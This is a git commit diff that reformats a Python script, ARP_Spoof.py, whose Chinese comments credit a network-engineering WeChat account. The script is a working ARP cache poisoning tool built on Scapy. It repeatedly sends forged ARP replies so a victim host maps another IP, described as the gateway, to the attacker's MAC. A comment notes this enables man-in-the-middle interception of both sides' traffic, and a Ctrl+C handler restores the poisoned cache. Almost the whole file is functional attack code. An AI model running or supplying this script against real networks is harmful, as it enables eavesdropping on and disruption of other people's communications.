4dc5ddec3afb44eb0cb710fd182feb3c3a679e44
singivs <815836441@qq.com>
2019-09-28 12:20:12 +0800

    20190928 排版优化

--- ARP/ARP_Spoof.py
+++ ARP/ARP_Spoof.py
@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 #-*- coding:UTF-8 -*-
 #欢迎关注微信公众号：点滴技术
-#这里有靠谱、有价值的、免费分享、成长的，专属于网络攻城狮的
+#这里有靠谱、有价值的、免费分享、成长的，属于网络攻城狮的空间
 
 import logging
 logging.getLogger("kamene.runtime").setLevel(logging.ERROR)  # 清除报错
@@ -15,47 +15,49 @@ import time
 import signal
 
 
-def arp_spoof(ip_1, ip_2, ifname='ens32'):
-    global localip, localmac, ip_1_mac, ip_2_mac, g_ip_1, g_ip_2, g_ifname  # 申明全局变量
-    g_ip_1 = ip_1  # 为全局变量赋值，g_ip_1为被毒化ARP设备的IP地址
-    g_ip_2 = ip_2  # 为全局变量赋值，g_ip_2为本机伪装设备的IP地址
-    g_ifname = ifname  # 为全局变量赋值，攻击使用的接口名字
+def arp_spoof(ip_1,ip_2,ifname='ens35'):
+    # 申明全局变量
+    global localip, localmac, dst_1_ip , dst_1_mac, dst_2_ip , dst_2_mac , local_ifname
 
-    # 获取本机IP地址，并且赋值到全局变量localip
-    localip = get_ip_address(ifname)
-    # 获取本机MAC地址，并且赋值到全局变量localmac
-    localmac = get_mac_address(ifname)
-    # 获取ip_1的真实MAC地址
-    ip_1_mac = arp_request(ip_1, ifname)[1]
-    # 获取ip_2的真实MAC地址
-    ip_2_mac = arp_request(ip_2, ifname)[1]
+    #赋值到全局变量
+    #dst_1_ip为被毒化ARP设备的IP地址，dst_ip_2为本机伪装设备的IP地址
+    #local_ifname为攻击者使用的网口名字
+    dst_1_ip, dst_2_ip, local_ifname= ip_1, ip_2, ifname
+
+    # 获取本机IP和MAC地址，并且赋值到全局变量
+    localip, localmac= get_ip_address(ifname), get_mac_address(ifname)
+
+    # 获取被欺骗ip_1的MAC地址，真实网关ip_2的MAC地址
+    dst_1_mac, dst_2_mac = arp_request(ip_1,ifname)[1], arp_request(ip_2,ifname)[1]
+
     # 引入信号处理机制，如果出现ctl+c（signal.SIGINT），使用sigint_handler这个方法进行处理
     signal.signal(signal.SIGINT, sigint_handler)
+
     while True:  # 一直攻击，直到ctl+c出现！！！
         # op=2,响应ARP
-        sendp(Ether(src=localmac, dst=ip_1_mac) / ARP(op=2, hwsrc=localmac, hwdst=ip_1_mac, psrc=g_ip_2, pdst=g_ip_1),
-              iface=scapy_iface(g_ifname),
+        sendp(Ether(src=localmac, dst=dst_1_mac) / ARP(op=2, hwsrc=localmac, hwdst=dst_1_mac, psrc=dst_2_ip, pdst=dst_1_ip),
+              iface=scapy_iface(local_ifname),
               verbose=False)
-        # op=1,请求ARP
-        # sendp(Ether(src=localmac, dst=ip_1_mac)/ARP(op=1, hwsrc=localmac, hwdst=ip_1_mac, psrc=g_ip_2, pdst=g_ip_1), iface = g_ifname, verbose = False)
-        # 以太网头部的src MAC地址与ARP数据部分的hwsrc MAC不匹配攻击效果相同
-        # sendp(Ether(src=ip_1_mac, dst=ip_1_mac)/ARP(op=1, hwsrc=localmac, hwdst=ip_1_mac, psrc=g_ip_2, pdst=g_ip_1), iface = g_ifname, verbose = False)
-        # 如果采用dst为二层广播，会造成被伪装设备告警地址重叠，并且欺骗效果不稳定，容易抖动！
-        print("发送ARP欺骗数据包！欺骗" + ip_1 + ',本机MAC地址为' + ip_2 + '的MAC地址！！！')
+
+        print("发送ARP欺骗数据包！欺骗{} , {}的MAC地址已经是我本机{}的MAC地址啦!!!".format(ip_1,ip_2,ifname))
         time.sleep(1)
 
 
-def sigint_handler(signum, frame):  # 定义处理方法
-    global localip, localmac, ip_1_mac, ip_2_mac, g_ip_1, g_ip_2, g_ifname  # 引入全局变量
+# 定义处理方法
+def sigint_handler(signum, frame):
+    # 申明全局变量
+    global localip, localmac, dst_1_ip , dst_1_mac, dst_2_ip , dst_2_mac , local_ifname
+
     print("\n执行恢复操作！！！")
     # 发送ARP数据包，恢复被毒化设备的ARP缓存
-    sendp(Ether(src=ip_2_mac, dst=ip_1_mac) / ARP(op=2, hwsrc=ip_2_mac, hwdst=ip_1_mac, psrc=g_ip_2, pdst=g_ip_1),
-          iface=scapy_iface(g_ifname),
+    sendp(Ether(src=dst_2_mac, dst=dst_1_mac) / ARP(op=2, hwsrc=dst_2_mac, hwdst=dst_1_mac, psrc=dst_2_ip, pdst=dst_1_ip),
+          iface=scapy_iface(local_ifname),
           verbose=False)
-    print("已经恢复 " + g_ip_1 + " ARP缓存")
+    print("已经恢复 {} 的ARP缓存啦".format(dst_1_ip))
     # 退出程序，跳出while True
     sys.exit()
 
 if __name__ == "__main__":
-    arp_spoof('192.168.0.102' , '192.168.0.101' , 'ens32') #欺骗192.168.0.10 让它认为192.168.0.101的MAC地址为本机攻击者
-                                                          #计算机的MAC
+    # 欺骗192.168.1.101,让它认为192.168.1.102的MAC地址为本机攻击者的MAC
+    #如果攻击者没有路由通信就会中断，如有路由就可以窃取双方通信的信息(所谓中间人)
+    arp_spoof('192.168.1.101' , '192.168.1.102' , 'ens35')
